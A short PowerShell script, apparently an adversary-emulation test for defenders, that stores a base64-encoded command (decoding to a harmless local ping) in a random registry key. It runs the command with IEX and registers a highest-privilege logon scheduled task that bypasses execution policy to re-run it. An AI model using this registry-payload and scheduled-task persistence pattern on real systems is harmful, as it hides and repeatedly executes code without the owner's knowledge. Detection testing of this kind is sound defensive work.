###
# Atomics on a Friday
# Educational Purposes Only
# Blue Team only.
# Simple registry create. base64 in key that will ping.
# a schtask will be created to run onlogon
###

# Generate a random string
$randomString = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })

# Define registry path and key
$registryPath = "HKCU:\SOFTWARE\Microsoft\$randomString"
$registryKey = $env:USERNAME + '0'
$fullRegistryPath = "$($registryPath)\$($registryKey)"

# Create the registry key if it doesn't exist
if (!(Test-Path $registryPath)) {
    New-Item -Path $registryPath -Force | Out-Null
}

# Write the base64 encoded string to the registry
Set-ItemProperty -Path $registryPath -Name $registryKey -Value 'cGluZyAxMjcuMC4wLjE='

# Display the registry path and key
Write-Host "Registry Path: $registryPath"
Write-Host "Registry Key: $registryKey"

powershell.exe -Command "IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path '$registryPath').$registryKey)))"

$scriptBlockContent = @"
{
    `$(IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path '$registryPath').$registryKey))))
}
"@

schtasks.exe /Create /F /TN "The Goots Was Here" /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command & $scriptBlockContent" /SC ONLOGON /RL HIGHEST
